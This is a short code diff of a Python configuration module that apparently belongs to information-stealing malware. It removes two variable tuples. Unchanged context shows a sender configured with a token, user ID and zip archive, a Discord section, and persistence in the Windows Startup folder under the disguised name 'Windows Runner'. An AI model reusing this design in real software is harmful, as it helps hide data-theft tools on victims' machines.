@@ -70,7 +70,6 @@ class SystemConfig:
 
 class SenderConfig:
 
-    Variables = ("zip_name", "storage_path", "token", "user_id", "errors")
     UserAgent = user_agent
 
 
@@ -79,7 +78,6 @@ class AutostartConfig:
     ExecutorPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows"
     AutostartName = "Windows Runner"
     AutostartPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-    Variables = ("executor_path", "statuses", "errors")
 
 
 class DiscordConfig:
